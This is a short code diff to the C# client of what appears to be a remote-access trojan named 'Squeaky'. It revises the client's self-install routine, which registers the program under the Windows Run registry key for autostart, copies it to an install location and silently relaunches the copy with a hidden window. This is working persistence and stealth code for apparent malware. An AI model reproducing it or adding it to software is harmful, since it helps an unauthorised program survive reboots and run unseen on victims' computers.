@@ -83,26 +83,29 @@ namespace Squeaky.Client
 
             using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
             {
-                key.SetValue(Settings.INSTALLNAME, "\"" + Settings.INSTALLATION + "\" -startup");
+                key.SetValue(Settings.INSTALLNAME, "\"" + Settings.INSTALLATION + "\"");
             }
         }
 
-        private static void Start()
+        public static void Start()
         {
-            if (Settings.STARTUP) AddToStartup();
-
-            if (Settings.INSTALL)
+            if (CurrentLocation != Settings.INSTALLATION)
             {
-                Install();
+                if (Settings.STARTUP) AddToStartup();
 
-                var startInfo = new ProcessStartInfo
+                if (Settings.INSTALL)
                 {
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    FileName = Settings.INSTALLATION
-                };
-                Process.Start(startInfo);
+                    Install();
+
+                    var startInfo = new ProcessStartInfo
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        FileName = Settings.INSTALLATION
+                    };
+                    Process.Start(startInfo);
+                }
             }
         }
     }
